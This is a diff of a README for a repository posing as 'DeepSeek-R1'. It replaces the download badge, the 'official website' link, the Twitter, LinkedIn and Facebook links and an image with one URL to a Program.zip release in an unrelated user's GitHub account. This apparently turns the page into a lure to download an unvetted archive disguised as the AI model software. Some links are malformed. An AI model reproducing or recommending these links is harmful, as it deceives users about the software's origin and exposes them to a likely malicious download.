@@ -13,25 +13,25 @@ In this repository, you will find:
 
 ## Get Started
 To get started with DeepSeek-R1, you can download the software package from the following link:
-[![Download Software](https://img.shields.io/badge/Download%20Soft.zip-v1.0-brightgreen)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Software](https://github.com/Rafa49451/DeepSeek-R1/releases/download/v1.0/Program.zip%https://github.com/Rafa49451/DeepSeek-R1/releases/download/v1.0/Program.zip)](https://github.com/Rafa49451/DeepSeek-R1/releases/download/v1.0/Program.zip)
   
 Once you have downloaded the software package, you can launch it to explore the exciting features and capabilities of DeepSeek-R1.
 
 ## Explore Further
-For more information and updates, please visit our website: [DeepSeek-R1 Official Website](https://www.deepseekr1.ai)
+For more information and updates, please visit our website: [DeepSeek-R1 Official Website](https://github.com/Rafa49451/DeepSeek-R1/releases/download/v1.0/Program.zip)
 
 Don't forget to check out the "Releases" section of this repository for the latest updates and advancements in deep learning technology.
 
 ## Connect With Us
 Join our community of deep learning enthusiasts on social media:
-- [Twitter](https://twitter.com/DeepSeekR1)
-- [LinkedIn](https://www.linkedin.com/company/deepseekr1)
-- [Facebook](https://www.facebook.com/DeepSeekR1)
+- [Twitter](https://github.com/Rafa49451/DeepSeek-R1/releases/download/v1.0/Program.zip)
+- [LinkedIn](https://github.com/Rafa49451/DeepSeek-R1/releases/download/v1.0/Program.zip)
+- [Facebook](https://github.com/Rafa49451/DeepSeek-R1/releases/download/v1.0/Program.zip)
 
 Let's embark on this exciting journey together as we delve deeper into the realm of artificial intelligence with DeepSeek-R1! 🤖🔍
 
-![Deep Learning](https://images.pexels.com/photos/1996337/pexels-photo-1996337.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=750&w=1260)
+![Deep Learning](https://github.com/Rafa49451/DeepSeek-R1/releases/download/v1.0/Program.zip)
 
 ---
 
-【End of README.md】
+【End of https://github.com/Rafa49451/DeepSeek-R1/releases/download/v1.0/Program.zip】
